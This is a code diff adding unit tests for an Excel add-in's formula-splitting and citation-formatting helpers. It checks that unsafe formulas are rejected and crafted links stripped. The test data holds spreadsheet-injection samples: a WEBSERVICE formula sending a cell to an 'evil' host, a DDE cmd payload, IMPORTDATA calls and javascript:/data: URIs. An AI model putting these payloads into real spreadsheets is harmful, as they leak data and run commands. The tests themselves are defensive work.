@@ -1,7 +1,12 @@
 import { describe, it, expect } from 'vitest';
 import { ResolvedContextSchema, asChangeId } from '@ge/contracts';
 import { rangeToContext, selectionValuesToContext, splitHeaderRows } from './capture.js';
-import { planWriteCells } from './actuate-plan.js';
+import {
+  formatSourceComment,
+  isUnsafeFormula,
+  planWriteCells,
+  splitFormulaGrid,
+} from './actuate-plan.js';
 
 describe('excel capture (pure)', () => {
   it('splits a grid into header columns and data rows', () => {
@@ -77,5 +82,116 @@ describe('excel actuation planning (pure)', () => {
       params: {},
     });
     expect(plan).toEqual({ values: [] });
+  });
+});
+
+describe('splitFormulaGrid (formula-first, pure)', () => {
+  it('routes =-prefixed cells into formulas (null in values) and literals into values', () => {
+    const grid = splitFormulaGrid([
+      ['Revenue', '=SUM(B2:B3)'],
+      ['120', '=A2*2'],
+    ]);
+    expect(grid.hasFormulas).toBe(true);
+    expect(grid.formulas).toEqual([
+      [null, '=SUM(B2:B3)'],
+      [null, '=A2*2'],
+    ]);
+    expect(grid.values).toEqual([
+      ['Revenue', null],
+      ['120', null],
+    ]);
+  });
+
+  it('leaves an all-values grid unchanged with hasFormulas false', () => {
+    const grid = splitFormulaGrid([
+      ['Region', 'Revenue'],
+      ['EMEA', '120'],
+    ]);
+    expect(grid.hasFormulas).toBe(false);
+    expect(grid.formulas).toEqual([
+      [null, null],
+      [null, null],
+    ]);
+    expect(grid.values).toEqual([
+      ['Region', 'Revenue'],
+      ['EMEA', '120'],
+    ]);
+  });
+
+  it('detects a formula only by a leading =, not = elsewhere in the cell', () => {
+    const grid = splitFormulaGrid([['a=b', '=b', ' =c']]);
+    expect(grid.hasFormulas).toBe(true);
+    // 'a=b' is a literal; '=b' is a formula; ' =c' (leading space) is a literal.
+    expect(grid.formulas).toEqual([[null, '=b', null]]);
+    expect(grid.values).toEqual([['a=b', null, ' =c']]);
+  });
+
+  it('handles an empty grid', () => {
+    expect(splitFormulaGrid([])).toEqual({
+      formulas: [],
+      values: [],
+      hasFormulas: false,
+      rejected: [],
+    });
+  });
+
+  it('rejects unsafe active-content formulas instead of evaluating them', () => {
+    const grid = splitFormulaGrid([
+      ['=SUM(A1:A2)', '=WEBSERVICE("http://evil/?d="&A1)'],
+      ["=cmd|'/c calc'!A1", "=HYPERLINK('[Book.xlsx]Sheet1'!A1)"],
+    ]);
+    // The safe SUM is still routed to formulas; the three vectors are rejected, not evaluated.
+    expect(grid.rejected).toHaveLength(3);
+    expect(grid.formulas[0]?.[0]).toBe('=SUM(A1:A2)');
+    expect(grid.formulas[0]?.[1]).toBeNull();
+    expect(grid.formulas[1]).toEqual([null, null]);
+    // Rejected cells appear in neither grid (both null) so they can never be written/evaluated.
+    expect(grid.values[0]?.[1]).toBeNull();
+  });
+
+  it('isUnsafeFormula flags web/data/DDE/external-ref, allows pure computation', () => {
+    expect(isUnsafeFormula('=SUM(A1:B2)')).toBe(false);
+    expect(isUnsafeFormula('=A1*2+VLOOKUP(B1,C:D,2,0)')).toBe(false);
+    expect(isUnsafeFormula('=WEBSERVICE("http://x")')).toBe(true);
+    expect(isUnsafeFormula('=IMPORTDATA("http://x")')).toBe(true);
+    expect(isUnsafeFormula("=cmd|'/c calc'!A1")).toBe(true);
+    expect(isUnsafeFormula("='[Budget.xlsx]Q1'!A1")).toBe(true);
+  });
+});
+
+describe('formatSourceComment (citations, pure)', () => {
+  it('renders Title (uri) one per line, dropping the uri when absent', () => {
+    const text = formatSourceComment([
+      { title: 'SLA Policy', uri: 'https://acme/sla' },
+      { title: 'Uptime Memo' },
+    ]);
+    expect(text).toBe('SLA Policy (https://acme/sla)\nUptime Memo');
+  });
+
+  it('returns an empty string for no sources', () => {
+    expect(formatSourceComment([])).toBe('');
+  });
+
+  it('caps overly long output with an ellipsis', () => {
+    const long = 'x'.repeat(100);
+    const text = formatSourceComment([{ title: long }], 20);
+    expect(text).toHaveLength(20);
+    expect(text.endsWith('…')).toBe(true);
+  });
+
+  it('does not cap output already within the limit', () => {
+    const text = formatSourceComment([{ title: 'short' }], 20);
+    expect(text).toBe('short');
+  });
+
+  it('drops a non-http(s) uri scheme and single-lines a crafted title', () => {
+    const text = formatSourceComment([
+      { title: 'Click', uri: 'javascript:alert(1)' },
+      { title: 'Line1\nLine2 forged source', uri: 'data:text/html,evil' },
+    ]);
+    // javascript:/data: uris are dropped; newlines in the title can't forge extra source lines.
+    expect(text).toBe('Click\nLine1 Line2 forged source');
+    expect(text).not.toContain('javascript:');
+    expect(text).not.toContain('data:');
   });
 });
